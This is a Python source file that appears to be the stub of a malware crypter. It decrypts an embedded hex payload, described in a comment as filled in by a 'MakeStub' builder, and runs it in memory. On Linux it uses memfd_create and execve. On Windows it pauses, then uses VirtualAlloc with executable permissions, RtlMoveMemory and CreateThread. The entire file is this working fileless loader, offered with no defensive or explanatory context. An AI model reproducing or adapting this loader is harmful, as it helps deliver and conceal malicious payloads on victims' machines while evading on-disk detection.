import ctypes, os
from utils.Algorythm import x
from time import sleep

def execute_binary_from_memory(binary_data):
    if os.name == "posix":
        memfd = os.memfd_create("mem_exec", 0)
        os.write(memfd, binary_data)
        os.execve(f"/proc/self/fd/{memfd}", ["mem_exec"], os.environ)  # Use path
    elif os.name == "nt":
        sleep(3)
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        alloc = kernel32.VirtualAlloc(None, len(binary_data), 0x3000, 0x40)
        ctypes.windll.kernel32.RtlMoveMemory(alloc, binary_data, len(binary_data))
        thread = kernel32.CreateThread(None, 0, alloc, None, 0, ctypes.byref(ctypes.wintypes.DWORD()))
        kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)
    else:
        return 0

b = "xzxzxzxzx"  # Will be replaced by MakeStub
k = "kykykykyky"
dc = x(k)
y = dc.decrypt(bytes.fromhex(b))
execute_binary_from_memory(y)